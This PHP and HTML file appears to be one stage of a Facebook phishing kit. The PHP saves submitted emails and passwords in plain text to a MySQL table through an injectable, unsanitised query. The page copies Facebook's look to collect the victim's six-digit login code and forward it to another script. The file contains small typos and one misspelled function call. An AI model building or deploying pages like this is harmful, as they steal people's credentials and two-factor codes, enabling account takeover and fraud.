<?php
$email = filter_input(INPUT_POST, 'email');
$password = filter_input(INPUT_POST, 'password');

if(!empty($email)){
if(!empty($password)){

$host = "localhost";
$dbusername = "root";
$dbpassword = "";
$dbname = "email_and_passworddb";

//create connection
$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);

if(mysqli_connect_error()){
  die('coonectError('.mysqli_connect_errno().')'.msqli_connect_error());
}
else{
  $sql = "INSERT INTO emailpassword(email, password) values ('$email', '$password')";
  if ($conn->query($sql)){
    echo "";
  }
  else{
    echo "Error:" .$sql ."<br>". $conn->error;
  }
  $conn->close();
}

}
else{
  echo "password should not be empty";
  die();
}
}
else{
  echo"email should not be empty";
  die();
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>enter your 6 digit coe</title>
  <style>
    body{
      margin: 0;
      padding: 0;
      background-color: whitesmoke;
    }
    h2{ 
      font-family: "facebook letter faces";
      font-size: 35px;
      color: #1877f2;
      display: flex;
      width: 100%;
      justify-content: center;
      top: 0;
      position: fixed;
    }

    .enter, .gmail{
      font-family: 'Arial';
      text-align: center;
    }
    .enterandgmail{
      margin-top: 150px;
    }

    .codecontainer{
      width: 100%;
      height: 200px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    
    .enterfbcode{
      font-size: 20px;
      font-family: sans-serif;
    }
    .code{
      padding: 4px;
      width: 190px;
      border: 1px solid;
      border-color:rgb(211, 209, 206);
    }
    .continue{
      width: 200px;
      color: white;
      border-color:#1877f2;
      background-color: #1877f2;
      padding: 5px;
    }
    .nocode{
      text-decoration: none;
      border: 1px solid #818285; 
      width: 200px;
      color: black;
      background-color: whitesmoke; 
      border-radius: 5px;
      padding: 5px;
    }

    .hiddenbutton{
      border: 1px solid white; 
      width: 200px;
      color: blue;
      border-radius: 5px;
      padding: 5px;
    }

    .input-control input:focus{
    outline: 0;
  }
  .input-control.sucess input{
    border-color: #09c372;
  }
  .input-control.error input{
    border-color: #ff3860;
  }
  .input-control .error{
    color: red;
    font-size: 10px;
    height: 25px;
    font-family: 'Arial';
  } 

    


  </style>
</head>
<body>
  <h2>facebook</h2>
  <div class="enterandgmail">
<h1 class="enter"> Enter the 6-digit code sent to:
  </h1><p class="gmail">********@gmail.com <br>
+44******************* </p></div>

  <form id="form" class="form" action="nextpage.php" method="post">
  <div class="codecontainer">
  <div class="codebox">
      <p class="enterfbcode">Enter facebook code</p>

      <div class="input-control">
        <input placeholder="enter 6-digit code" class="code" id="password" name="password" type="password">
        <div class="error"></div>
    </div>

     <button class="continue" type="submit">Continue</button>
   
    
    </form> 
    <br>
      <div><br>
       <a class="nocode" id="btn" href="" >Didn't get a code?</a> <br><br>

       <a class="hiddenbutton" id="button" href="nextpage.php"></a>
      
      

  
       
  </div>
</div> 

<script src="codepage.js"></script>
</body>
</html>